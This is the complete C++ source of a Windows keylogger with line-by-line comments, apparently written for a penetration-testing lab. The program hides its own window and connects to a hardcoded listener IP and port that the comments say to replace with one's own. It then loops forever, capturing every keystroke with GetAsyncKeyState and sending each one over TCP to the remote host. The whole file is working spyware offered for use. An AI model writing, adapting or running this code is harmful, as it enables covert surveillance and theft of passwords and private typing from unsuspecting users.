#define _WINSOCK_DEPRECATED_NO_WARNINGS /* we use winsock utilities and we do not want the compiler to complain about older functionalities used since the below code is sufficient for our needs. */
#pragma comment(lib, "Ws2_32.lib") /* we need the library Ws2_32.lib library in order to use sockets (networking) */
#include <iostream> //standard input/output utilities
#include <winsock2.h> //networking utilities
#include <stdio.h> //standard input/output utilities
#include <stdlib.h> //standard input/output utilities
#include <Windows.h> //Windows libraries

int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE); // do not show (hide) this program window
    char KEY; //declare a variable for single key, of type char
    WSADATA WSAData; /* declaration of Structure (structure is a specific type of variable) holding information about windows socket implementation */
    SOCKET server; //variable used to store the connection, of type SOCKET
    SOCKADDR_IN addr; /* variable holding connection details - of SOCKADDR_IN type (also a structure) */
    WSAStartup(MAKEWORD(2, 0), &WSAData); /* initialize usage of the winsock library (needed for opening a network connection) */
    server = socket(AF_INET, SOCK_STREAM, 0); //set up a TCP socket
    addr.sin_addr.s_addr = inet_addr("10.10.11.111"); /* specify the target of the network connection - replace the ip with your listening (tap0) ip address */
    addr.sin_family = AF_INET; /* set address family (AF) to AF_INET - this address family contains the IPv4 addresses to be used to communicateover TCP */
    addr.sin_port = htons(4444); //remote port - change it to your listening port
    connect(server, (SOCKADDR *)&addr, sizeof(addr)); /* connect to the previously set up target host/port */
    
    while (true) { //do this forever:
        Sleep(10); //pause (Sleep) for 10 miliseconds
        for (int KEY = 0x8; KEY < 0xFF; KEY++){ /* check if this is a printable key (key codes are defined by Microsoft) */
            
            if (GetAsyncKeyState(KEY) == -32767) { //if a key was pressed
                char buffer[2]; //declare a variable that will hold the pressed key
                buffer[0] = KEY; //insert the key into the variable
                send(server, buffer, sizeof(buffer), 0);//send it over the network
            }
        } 
    }
        
    closesocket(server); //close socket
    WSACleanup(); //clean up Winsock 
}